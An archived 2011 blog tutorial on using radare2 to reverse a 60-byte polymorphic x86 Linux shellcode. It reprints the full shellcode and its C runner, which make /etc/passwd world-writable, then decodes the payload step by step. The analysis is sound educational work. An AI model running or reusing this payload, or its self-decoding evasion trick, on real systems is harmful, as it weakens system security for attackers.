@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8"/>
+<title>Adventures with Radare2 #1: A Simple Shellcode Analysis | Can&#039;t Hack, Won&#039;t Hack</title>
+<link rel="profile" href="//gmpg.org/xfn/11"/>
+<link rel="stylesheet" type="text/css" media="all" href="//canthack.org/wp-content/themes/twentyten/style.css"/>
+<link rel="alternate" type="application/rss+xml" title="Can&#039;t Hack, Won&#039;t Hack &raquo; Feed" href="//canthack.org/wp-content/plugins/really-static/static/feed/"/>
+<link rel="alternate" type="application/rss+xml" title="Can&#039;t Hack, Won&#039;t Hack &raquo; Comments Feed" href="//canthack.org/wp-content/plugins/really-static/static/comments/feed/"/>
+<link rel="alternate" type="application/rss+xml" title="Can&#039;t Hack, Won&#039;t Hack &raquo; Adventures with Radare2 #1: A Simple Shellcode Analysis Comments Feed" href="//canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/feed/"/>
+<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/canthack.org\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.2"}};
+			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+<style type="text/css">img.wp-smiley,img.emoji{display:inline!important;border:none!important;box-shadow:none!important;height:1em!important;width:1em!important;margin:0 .07em!important;vertical-align:-0.1em!important;background:none!important;padding:0!important;}</style>
+<link rel='stylesheet' id='fancybox-css' href='//canthack.org/wp-content/plugins/fancyboxify/fancybox/fancybox.css?ver=1.3.4' type='text/css' media='all'/>
+<link rel='stylesheet' id='genericons-css' href='//canthack.org/wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css?ver=3.1' type='text/css' media='all'/>
+<link rel='stylesheet' id='jetpack_css-css' href='//canthack.org/wp-content/plugins/jetpack/css/jetpack.css?ver=3.5.3' type='text/css' media='all'/>
+<script type='text/javascript' src='//canthack.org/wp-includes/js/jquery/jquery.js?ver=1.11.2'></script>
+<script type='text/javascript' src='//canthack.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='//canthack.org/wp-content/plugins/fancyboxify/fancybox/jquery.fancybox.pack.js?ver=1.3.4'></script>
+<script type='text/javascript' src='//canthack.org/wp-content/plugins/fancyboxify/fancybox/jquery.easing.pack.js?ver=1.3'></script>
+<script type='text/javascript' src='//canthack.org/wp-content/plugins/fancyboxify/fancybox/jquery.mousewheel.pack.js?ver=3.0.4'></script>
+<link rel='prev' title='phphgdc &#8211; A PHP client for HGD' href='//canthack.org/wp-content/plugins/really-static/static/2011/07/phphgdc-a-php-client-for-hgd/'/>
+<link rel='next' title='HGD 0.4.1 out now!' href='//canthack.org/wp-content/plugins/really-static/static/2011/07/hgd-0-4-1/'/>
+<meta name="generator" content="WordPress 4.2.2"/>
+<link rel='canonical' href='//canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/'/>
+<script type="text/javascript">
+	jQuery(document).ready(function($){
+		var imglinks = $('a[href$=".jpg"], a[href$=".jpeg"], a[href$=".png"], a[href$=".gif"], a[href$=".JPG"], a[href$=".JPEG"], a[href$=".PNG"], a[href$=".GIF"]');
+
+		imglinks.each(function(){ 
+			if ( $(this).attr('rel').indexOf("fancybox") != -1 ) {
+				$(this).fancybox({
+					'transitionIn'	:	'none',
+					'transitionOut'	:	'none',
+					'titlePosition'	:	'over',
+					'titleFormat'	:	function(title, currentArray, currentIndex, currentOpts){
+									return '<span id="fancybox-title-over">(' + (currentIndex + 1) + ' / ' + currentArray.length + (title.length ? ')&nbsp;&nbsp;' + title : ')') + '</span>';
+								},
+					'title'		:	$(this).find("img").first().attr("title")	// Extract title from the first <img> element within the <a>
+				});
+			}
+		});
+	});
+</script><meta name="really-static looptest" content="testtesttest"/>
+ 
+<meta property="og:type" content="article"/>
+<meta property="og:title" content="Adventures with Radare2 #1: A Simple Shellcode Analysis"/>
+<meta property="og:url" content="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/"/>
+<meta property="og:description" content="Radare2 is an open-source reverse engineering toolkit, consisting of a disassembler, debugger and hex editor. In this article I will show you the basics by reversing some shellcode I found on Proje..."/>
+<meta property="article:published_time" content="2011-07-17T14:03:51+00:00"/>
+<meta property="article:modified_time" content="2012-05-18T14:42:14+00:00"/>
+<meta property="article:author" content="http://canthack.org/wp-content/plugins/really-static/static/author/edd/"/>
+<meta property="og:site_name" content="Can&#039;t Hack, Won&#039;t Hack"/>
+<meta property="og:image" content="https://s0.wp.com/i/blank.jpg"/>
+<meta property="og:locale" content="en_US"/>
+<meta name="twitter:card" content="summary"/>
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+</head>
+<body class="single single-post postid-804 single-format-standard">
+<div id="wrapper" class="hfeed">
+<div id="header">
+<div id="masthead">
+<div id="branding" role="banner">
+<div id="site-title">
+<span>
+<a href="http://canthack.org/wp-content/plugins/really-static/static/" title="Can&#039;t Hack, Won&#039;t Hack" rel="home">Can&#039;t Hack, Won&#039;t Hack</a>
+</span>
+</div>
+<div id="site-description"></div>
+<img src="//canthack.org/uploads/sltrain.jpg" width="940" height="198" alt=""/>
+</div> 
+<div id="access" role="navigation">
+<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
+<div class="menu"><ul><li><a href="http://canthack.org/wp-content/plugins/really-static/static/">Home</a></li><li class="page_item page-item-2"><a href="http://canthack.org/wp-content/plugins/really-static/static/about/">About</a></li><li class="page_item page-item-106"><a href="http://canthack.org/wp-content/plugins/really-static/static/future/">Future</a></li><li class="page_item page-item-247"><a href="http://canthack.org/wp-content/plugins/really-static/static/rules/">Rules</a></li></ul></div>
+</div> 
+</div> 
+</div> 
+<div id="main">
+<div id="container">
+<div id="content" role="main">
+<div id="nav-above" class="navigation">
+<div class="nav-previous"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/phphgdc-a-php-client-for-hgd/" rel="prev"><span class="meta-nav">&larr;</span> phphgdc &#8211; A PHP client for HGD</a></div>
+<div class="nav-next"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/hgd-0-4-1/" rel="next">HGD 0.4.1 out now! <span class="meta-nav">&rarr;</span></a></div>
+</div> 
+<div id="post-804" class="post-804 post type-post status-publish format-standard hentry category-software">
+<h1 class="entry-title">Adventures with Radare2 #1: A Simple Shellcode Analysis</h1>
+<div class="entry-meta">
+<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" title="14:03" rel="bookmark"><span class="entry-date">July 17, 2011</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://canthack.org/wp-content/plugins/really-static/static/author/edd/" title="View all posts by Edd">Edd</a></span> </div> 
+<div class="entry-content">
+<p><a href="http://radare.org">Radare2</a> is an open-source reverse engineering toolkit, consisting of a disassembler, debugger and hex editor. In this article I will show you the basics by reversing some shellcode I found on <a href="http://www.projectshellcode.com/" target="_blank">Project Shellcode</a></p>
+<h2>Shellcode</h2>
+<p>To put this into context let&#8217;s briefly discuss what we mean by the term &#8220;shellcode&#8221;, not to be confused with &#8220;shellscript&#8221;, which is something else entirely. &#8220;Shellcode&#8221; is a term colloquially used to refer to the payload of an exploit. Typically this would be code injected to start a shell.</p>
+<p>Project Shellcode is a repository of shellcodes (with source), which I found via <a href="http://reddit.com/r/reverseengineering">reddit.com/r/reverseengineering</a> last month (thanks polsab); let&#8217;s look at one of the examples found there.</p>
+<h2>60 Bytes Chmod 777 Polymorphic x86 Linux Shellcode</h2>
+<p>The first shellcode I happened to look at from projectshellcode was <a href="http://www.projectshellcode.com/?q=node/289">this</a></p>
+<pre>
+<code>
+/*
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
+Date   : Sat Jun  5 16:10:00 2010
+Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
+Web    : http://devilzc0de.org
+blog   : http://gunslingerc0de.wordpress.com
+tested on : linux debian
+special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
+ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
+mywisdom (devilzc0de.org), loneferret (offensive-security.com)
+*/
+
+/*
+root@localhost# ls -la /etc/passwd
+-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
+root@localhost# gcc -o polymorphic_chmod polymorphic_chmod.c
+chmod.c: In function ‘main’:
+chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
+root@localhost# ./polymorphic_chmod
+Length: 64
+root@localhost# ls -la /etc/passwd
+-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
+root@localhost# chmod 644 /etc/passwd
+root@localhost# ls -la /etc/passwd
+-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
+*/
+
+#include <stdio.h>
+
+char shellcode[] =
+	"\xeb\x11\x5e\x31\xc9\xb1\x27\x80\x6c\x0e\xff\x35\x80\xe9\x01"
+	"\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x20\x4a\x66\xf5\xe5\x44"
+	"\x90\x66\xfe\x9b\xee\x34\x36\x02\xb5\x66\xf5\xe5\x36\x66\x10"
+	"\x02\xb5\x1d\x1b\x34\x34\x34\x64\x9a\xa9\x98\x64\xa5\x96\xa8"
+	"\xa8\xac\x99";
+
+int main(void)
+{
+       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
+	(*(void(*)()) shellcode)();
+     
+return 0;
+}
+</code>
+</pre>
+<p>Thanks to gunslinger for allowing me to use this code as an example.</p>
+<p>The description in comments claims that the code sets the file permissions on /etc/passwd to 777, but you would not know that at a glance. What we do know is that we have an array of bytes initialised as hex, which is then cast to a function pointer and called.</p>
+<h2>Analysis with Radare2</h2>
+<p>NOTE: This analysis was done using a hg tip snapshot of radare2 from July 2011. Some of the features have only recently been implemented or bugfixed, so using an older version will not work 😉 EDIT: Radare-2.0.8 was released 2 days ago, this will work!</p>
+<p>So how do we find out what this program does? We could build it and run it, but I won&#8217;t, as it could remove my home directory for all I know. Instead let us examine it statically using radare2.</p>
+<p>First we build a binary:</p>
+<pre>
+<code>
+% cc -o shellcode polymorphic_chmod_etc_passwd_777.c 
+polymorphic_chmod_etc_passwd_777.c: In function 'main':
+polymorphic_chmod_etc_passwd_777.c:53: warning: incompatible implicit
+declaration of built-in function 'strlen'
+</code>
+</pre>
+<p>Next we ignore the warning, and now we load it into radare2:</p>
+<pre>
+<code>
+% r2 ./shellcode
+ -- In soviet russia radare debugs you!
+[0x1c000764]>
+</code>
+</pre>
+<p>I started radare2 without -d, so we are running in &#8220;static&#8221; mode, as opposed to using the debugger built into radare2. Now radare is ready and waiting for commands, so let&#8217;s get to it.</p>
+<p>Radare2 commands tend to be very short, some only one letter long. Type &#8216;?&#8217; followed by enter to get an overview of what you can do. Suffixing a command with a question mark, will give more detailed information on it&#8217;s usage.</p>
+<p>What we should first do is locate that byte string. Because our binary was not stripped, we have the luxury of knowing what the virtual address of &#8216;main&#8217; is. Radare2 uses the concept of &#8220;flags&#8221; to mark useful locations in binaries. Try typing &#8216;f&#8217; to see a list of flags. The function main will be flagged as &#8216;sym.main&#8217;.</p>
+<p>We use the &#8216;pd&#8217; command to disassemble:</p>
+<pre>
+<code>
+[0x1c000764]> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="91e1f5d1e2e8fcbffcf0f8ff">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
+/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
+      0x1c000764  sym.main:
+      0x1c000764    0    8d4c2404         lea ecx, [esp+0x4]
+      0x1c000768    0    83e4f0           and esp, 0xfffffff0
+      0x1c00076b    0    ff71fc           push dword [ecx-0x4]
+      0x1c00076e    4+   55               push ebp
+      0x1c00076f    8+   89e5             mov ebp, esp
+      0x1c000771    8    51               push ecx
+      0x1c000772   12+   83ec14           sub esp, 0x14
+      0x1c000775   32+   c704244010003c   mov dword [esp], sym.shellcode
+      0x1c00077c   32>   e86bfdffff       call dword imp.strlen
+         ; imp.strlen() [1]
+      0x1c000781   32    bad831003c       mov edx, 0x3c0031d8
+      0x1c000786   32    89442408         mov [esp+0x8], eax
+      0x1c00078a   32    c74424040100003c mov dword [esp+0x4], str.Lengthd
+      0x1c000792   32    891424           mov [esp], edx
+      0x1c000795   32>   e822fdffff       call dword imp.fprintf
+         ; imp.fprintf() [2]
+      0x1c00079a   32    b84010003c       mov eax, sym.shellcode
+      0x1c00079f   32    ffd0             call eax
+         ; unk()
+      0x1c0007a1   32    b80000           invalid
+</code>
+</pre>
+<p>The &#8216;pd&#8217; command will disassemble a chunk of code equal to the &#8220;block size&#8221; (see the &#8216;b&#8217; command) and in this case it looks like main was bigger than our block size. Because we know that GCC will make &#8220;well-formed&#8221; functions, we ask radare2 to analyse this function and print it in its entirety:</p>
+<pre>
+<code>
+[0x1c000764]> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="64050224171d094a09050d0a">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
+/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
+[0x1c000764]> <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a0d0c4c6e0d3d9cd8ecdc1c9ce">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
+/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
+/ function: sym.main (75)
+|     0x1c000764  sym.main:
+|     0x1c000764    0    8d4c2404         lea ecx, [esp+0x4]
+|     0x1c000768    0    83e4f0           and esp, 0xfffffff0
+|     0x1c00076b    0    ff71fc           push dword [ecx-0x4]
+|     0x1c00076e    4+   55               push ebp
+|     0x1c00076f    8+   89e5             mov ebp, esp
+|     0x1c000771    8    51               push ecx
+|     0x1c000772   12+   83ec14           sub esp, 0x14
+|     0x1c000775   32+   c704244010003c   mov dword [esp], sym.shellcode
+|     0x1c00077c   32>   e86bfdffff       call dword imp.strlen
+|        ; imp.strlen() [1]
+|     0x1c000781   32    bad831003c       mov edx, 0x3c0031d8
+|     0x1c000786   32    89442408         mov [esp+0x8], eax
+|     0x1c00078a   32    c74424040100003c mov dword [esp+0x4], str.Lengthd
+|     0x1c000792   32    891424           mov [esp], edx
+|     0x1c000795   32>   e822fdffff       call dword imp.fprintf
+|        ; imp.fprintf() [2]
+|     0x1c00079a   32    b84010003c       mov eax, sym.shellcode
+|     0x1c00079f   32    ffd0             call eax
+|        ; unk()
+|     0x1c0007a1   32    b800000000       mov eax, 0x0
+|     0x1c0007a6   32    83c414           add esp, 0x14
+|     0x1c0007a9   12-   59               pop ecx
+|     0x1c0007aa    8-   5d               pop ebp
+|     0x1c0007ab    4-   8d61fc           lea esp, [ecx-0x4]
+\     0x1c0007ae    4    c3               ret
+      ; ------------
+</code>
+</pre>
+<p>A quick eyeballing of this code shows us what we need to know.  There was enough information in our binary for radare2 to flag the byte string holding the exploit. If you want to see the actual address of this string, you can turn off the asm.filter using the &#8216;e&#8217; command; this will prevent radare2 from substituting symbols names for constants in disassembly views.</p>
+<p>What does the program do with the payload? We see strlen() and printf() being called, but more importantly, we see the address of the shellcode being loaded into eax before being called (load at 0x1c00079a, call at 0x1c00079f). The obvious next step is to examine the payload to get an idea of what it might do:</p>
+<pre>
+<code>
+[0x1c000764]> pD <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4076700033392d6e3328252c2c232f2425">[email&#160;protected]</a><script cf-hash='f9e31' type="text/javascript">
+/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */</script>
+     ,   0x3c001040  sym.shellcode:
+     ,=< 0x3c001040    0    eb11             jmp 0x3c001053 [1]
+     |   0x3c001042    0    5e               pop esi
+     |   0x3c001043   -4-   31c9             xor ecx, ecx
+     |   0x3c001045   -4    b127             mov cl, 0x27
+    .--> 0x3c001047   -4    806c0eff35       sub byte [esi+ecx-0x1], 0x35
+    ||   0x3c00104c   -4    80e901           sub cl, 0x1
+    `==< 0x3c00104f   -4    75f6             jnz 0x3c001047 [2]
+   ,===< 0x3c001051   -4    eb05             jmp 0x3c001058 [3]
+   | `-> 0x3c001053   -4>   e8eaffffff       call dword 0x3c001042
+   | |      ; 0x3c001042() [4]
+   `---> 0x3c001058   -4    204a66           and [edx+0x66], cl
+         0x3c00105b   -4    f5               cmc
+         0x3c00105c   -4    e544             in eax, 0x44
+         0x3c00105e   -4    90               nop
+         0x3c00105f   -4    66fe9b           o16 invalid
+         0x3c001062   -4    ee               out dx, al
+         0x3c001063   -4    3436             xor al, 0x36
+         0x3c001065   -4    02b566f5e536     add dh, [ebp+0x36e5f566]
+         0x3c00106b   -4    661002           o16 adc [edx], al
+         0x3c00106e   -4    b51d             mov ch, 0x1d
+         0x3c001070   -4    1b3434           sbb esi, [esp+esi]
+         0x3c001073   -4 string (5): "444d"
+         0x3c001078   -4 hex length=64 delta=2
+0x3c001078  64a5 96a8 a8ac 9900 0000 0000 0100 0000  d...............
+0x3c001088  0100 0000 0400 0000 c001 001c 0500 0000  ................
+0x3c001098  8803 001c 0600 0000 5802 001c 0a00 0000  ........X.......
+0x3c0010a8  bf00 0000 0b00 0000 1000 0000 1500       ..............  
+</pre>
+<p></code></p>
+<p>I used 'pD' here so that I could specify exactly how many bytes to disassemble (I chose 60). So what can we say about this? Well at first glance, there are some invalid operations which can't be executed, so that's a bit fishy.</p>
+<p>What I will now is do a symbolic execution of this code in my head. We first jump to 0x3c001053, from here we call to 0x3c001042, which happens to be the instruction right after where we came from in the first place. This could be pointless, but bear in mind that the call has pushed the return address of the call onto the stack. And what do you know, they immediately pop the return address into esi. In 32-bit x86 there is no way of getting directly at the program counter; what you have just seen is a well known hack used to get it. The value of the program counter can be used to refer to code/data relative to the payload (remember that the attacker does not know where his/her code will be relocated by the linker).</p>
+<p>So now we are at 0x3c001043 with 0x3c001058 in esi. The code zeros ecx by xoring it with itself, before loading 0x27 into the lowest byte of ecx. The next chunk of code which subtracts 0x35 from a [esi+ecx-0x1], for ecx = {0x27, 0x26, ... , 0x1} and we already know the value of esi from earlier. So by my calculations, we need to subtract 0x35 from 0x27 bytes starting at 0x3c001058 so as to emulate the effect of this self modifying code. We can do this using the 'wo' family of commands; let's ask radare2 for help on this:</p>
+<pre>
+<code>
+[0x1c000764]> wo?
+Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
+Example:
+  wox 0x90   ; xor cur block with 0x90
+  wox 90     ; xor cur block with 0x90
+  wox 0x0203 ; xor cur block with 0203
+  woa 02 03  ; add [0203][0203][...] to curblk
+Supported operations:
+  woa  +=  addition
+  wos  -=  substraction
+  wom  *=  multiply
+  wod  /=  divide
+  wox  ^=  xor
+  woo  |=  or
+  woA  &#038;=  and
+  wor  >>= shift right
+  wol  <<= shift left
+  wo2  2=  2 byte endian swap
+  wo4  4=  4 byte endian swap
+</code>
+</pre>
+<p>We need to use 'wos' so as to subtract a constant from a range of memory addresses, but before that we need to turn on io caching. By default radare2 opens files read-only, unless you give the -w flag. Alternatively we can set the io.cache option on, which caches writes in memory; These writes can be reverted or committed as the user pleases, but we will not be using these facilities for this example.</p>
+<pre>
+<code>
+[0x1c000764]> e io.cache=true
+[0x1c000764]> wos 0x35@0x3c001058:0x27
+[0x3c001040]> pd
+      ,   0x3c001040  sym.shellcode:
+      ,=< 0x3c001040    0    eb11             jmp 0x3c001053 [1]
+      |   0x3c001042    0    5e               pop esi
+      |   0x3c001043   -4-   31c9             xor ecx, ecx
+      |   0x3c001045   -4    b127             mov cl, 0x27
+     .--> 0x3c001047   -4    806c0eff35       sub byte [esi+ecx-0x1], 0x35
+     ||   0x3c00104c   -4    80e901           sub cl, 0x1
+     `==< 0x3c00104f   -4    75f6             jnz 0x3c001047 [2]
+    ,===< 0x3c001051   -4    eb05             jmp 0x3c001058 [3]
+    | `-> 0x3c001053   -4>   e8eaffffff       call dword 0x3c001042
+    | |      ; 0x3c001042() [4]
+   ,`---> 0x3c001058   -4    eb15             jmp 0x3c00106f [5]
+   |      0x3c00105a   -4    31c0             xor eax, eax
+   |      0x3c00105c   -4    b00f             mov al, 0xf
+   |      0x3c00105e   -4    5b               pop ebx
+   |      0x3c00105f   -8-   31c9             xor ecx, ecx
+   |      0x3c001061   -8    66b9ff01         mov cx, 0x1ff
+   |      0x3c001065   -8    cd80             int 0x80
+   |         ; syscall[0x80][3840]=?
+   |      0x3c001067   -8    31c0             xor eax, eax
+   |      0x3c001069   -8    b001             mov al, 0x1
+   |      0x3c00106b   -8    31db             xor ebx, ebx
+   |      0x3c00106d   -8    cd80             int 0x80
+   |         ; msync (0x100,0x0,0x1ff)
+   `----> 0x3c00106f   -8>   e8e6ffffff       call dword 0x3c00105a
+   |         ; 0x3c00105a() [6]
+          0x3c001074   -8 string (5): "444d"
+          0x3c001079   -8 hex length=64 delta=3
+0x3c001079  7061 7373 7764 0055 2720 666f 7220 7265  passwd.U' for re
+0x3c001089  646f 0000 0000 0000 0000 0000 0000 0000  do..............
+0x3c001099  0000 0000 0000 0000 0000 0000 0000 0000  ................
+0x3c0010a9  0000 0000 0000 0000 0000 0000 00         .............   
+</code>
+</pre>
+<p>And now we see that the instructions following 0x3c001058 are now valid. The first thing that I notice are these 'int 0x80' instructions. On a UNIX like operating system (running on x86/amd64), firing an 0x80 interrupt has a special meaning, it asks the kernel to execute a system call, whose number is held in eax.</p>
+<p>By following execution mentally (through a jump and a call), I can tell you that eax takes a value of 15 at 0x3c001065 and 1 at 0x3c00106d. We can identify these Linux system calls by grokking the 32-bit x86 kernel headers, or the easy way, google for them:<br />
+http://asm.sourceforge.net/syscall.html</p>
+<p>So we have a call to chmod(2) at 0x3c001065, followed by a call to exit(2) at 0x3c00106d. We will need to examine the arguments to calls in order to understand what they do. On a Linux system, system call arguments are passed in registers (ebx, ecx, edx, esi, edi, ebp).</p>
+<p>Let's look at the call to chmod(2); This call takes two arguments, so we should look in ebx and ecx for a char pointer indicating the path to a file, and a mode_t (which is just an integer really) specifying the mode (or permissions) to change to.  ebx is popped from the top of the stack at 0x3c00105e and if we follow execution backwards, we see that the last thing on the stack was a "return address" (0x3c001074) of the call at 0x3c00106f. Ofcourse this is not a return address at all, just a sneaky way to bundle a string into the payload. Let's look at the string using 'ps':</p>
+<pre>
+<code>
+[0x1c000764]> ps@0x3c001074
+/etc/passwd
+</code>
+</pre>
+<p>The second argument of the chmod call is in the ecx register and takes the value 0x1ff; which in octal, is 0777. So we have a call 'chmod("/etc/passwd", 0777);'. Naughty!</p>
+<p>After this the program simply calls the exit(2) system call.</p>
+<h2>Concluding Comments</h2>
+<p>What we have seen is an exploit which modifies itself at runtime in order to resist static disassembly. The technique is not new and is an easy way of preventing hard coded strings (like "/etc/passwd") from being detectable with utilities like strings(1).</p>
+<p>In fact, this exploit should not work on modern operating systems, as the payload was situated in the '.data' section of the binary, which (on any sane OS) can not be both executable and writable. I tried stepping over the call to the payload on my OpenBSD machine and it refused to execute, which is a good thing. EDIT: After discussion on <a href="http://www.reddit.com/r/ReverseEngineering/comments/is4e5/adventures_with_radare2_1_a_simple_shellcode/">reddit</a>, we concluded that this code should not work on modern architectures implementing a NX bit (or equivalent) and for other architectures, write-xor-execute protection can be implemented in software. Thanks for the clarification reddit.</p>
+<p>We explored some of the basic features of radare2, however, we have only scratched the surface. Go check it out at <a href="http://radare.org">radare.org</a></p>
+<p>If you fancy something slightly harder, try the same analysis on a stripped binary!</p>
+<p>Please let us know if you spot any errors or have any comments. Cheers.</p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-facebook"><a rel="nofollow" data-shared="sharing-facebook-804" class="share-facebook sd-button share-icon no-text" href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?share=facebook" target="_blank" title="Share on Facebook"><span></span><span class="sharing-screen-reader-text">Share on Facebook (Opens in new window)</span></a></li><li class="share-twitter"><a rel="nofollow" data-shared="sharing-twitter-804" class="share-twitter sd-button share-icon no-text" href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?share=twitter" target="_blank" title="Click to share on Twitter"><span></span><span class="sharing-screen-reader-text">Click to share on Twitter (Opens in new window)</span></a></li><li class="share-reddit"><a rel="nofollow" data-shared="" class="share-reddit sd-button share-icon no-text" href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?share=reddit" target="_blank" title="Click to share on Reddit"><span></span><span class="sharing-screen-reader-text">Click to share on Reddit (Opens in new window)</span></a></li><li class="share-stumbleupon"><a rel="nofollow" data-shared="" class="share-stumbleupon sd-button share-icon no-text" href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?share=stumbleupon" target="_blank" title="Click to share on StumbleUpon"><span></span><span class="sharing-screen-reader-text">Click to share on StumbleUpon (Opens in new window)</span></a></li><li class="share-email"><a rel="nofollow" data-shared="" class="share-email sd-button share-icon no-text" href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?share=email" target="_blank" title="Click to email this to a friend"><span></span><span class="sharing-screen-reader-text">Click to email this to a friend (Opens in new window)</span></a></li><li class="share-print"><a rel="nofollow" data-shared="" class="share-print sd-button 